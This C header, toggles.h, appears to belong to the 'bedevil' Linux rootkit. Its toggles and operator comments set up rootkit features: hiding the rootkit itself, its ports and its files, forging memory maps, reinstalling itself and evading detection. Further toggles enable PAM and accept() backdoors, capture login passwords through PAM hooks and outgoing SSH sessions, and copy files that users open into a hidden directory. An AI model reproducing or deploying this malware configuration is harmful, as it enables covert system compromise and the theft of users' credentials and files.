#ifndef TOGGLES_H
#define TOGGLES_H

/*
 * you can manually define or undefine these following toggles, or allow
 * bedevil.sh to make the changes for you.
 * `./bedevil.sh -t` will allow you to switch these toggles without editing
 * the file manually.

 * if you want a toggle to be ignored by toggles.sh, just put '//ignore'
 * at the end of the line.
 *     i.e.: '#define RANDOM_TOGGLE //ignore'
 */

/* LOG_SSH is by default disabled and ignored atm as it's
 * causing problems. */

/* requires PAM */
#undef USE_PAM_BD

/* no mandatory dependencies unless you choose to use SSL.
 * i'd have to discourage trying to use this for the time
 * being as this hasn't been my main focus as of late. */
#undef USE_ACCEPT_BD
/* requires SSL to be installed or present. SSL backdoor
 * source port is $(( ACCEPT_PORT + 1 )) */
#undef ACCEPT_USE_SSL

/* all of the essential presence hiding toggles are ignored... */
#define HIDE_SELF //ignore
#define FORGE_MAPS //ignore
#define HIDE_PORTS //ignore
#define DO_REINSTALL //ignore
#define DO_EVASIONS //ignore

/* this defines whether or not a backdoor user can hide & unhide
 * files on-the-fly via the exec hooks. (execve & execvp)
 * absolutely useless without HIDE_SELF. */
#define HIDING_UTIL //ignore

/* requires PAM. logs successful user authentications by hooking
 * the pam_prompt functions and writing respective user credentials
 * to the determined log file. */
#undef LOG_LOCAL_AUTH

/* when this is defined, outgoing ssh connections are logged.
 * the respective host, username and password used are written to
 * the log. you can read this log file in your installation directory.
 * there is no way of determining initially if the login is correct.
 * it's up to you to verify if the login works. */
/* totally disable this for the time being... */
#undef LOG_SSH //ignore

/* when this is defined, files opened by open and fopen
 * are copied to INTEREST_DIR. this is defined in
 * hooks/open/consts. (etc/defaults.sh defines the path itself)
 * the files that are of interest to us are defined in
 * hooks/open/char_arrays. */
#undef FILE_STEAL
/* when this is defined w/ FILE_STEAL, when an attempt to
 * steal a file by copying it to its new path fails,
 * attempt to make a new link in the interesting dir for
 * it instead. i would personally discourage using this
 * but it's here anyway... */
#undef LINK_IF_ERR //ignore

#define USE_CRYPT //ignore

#endif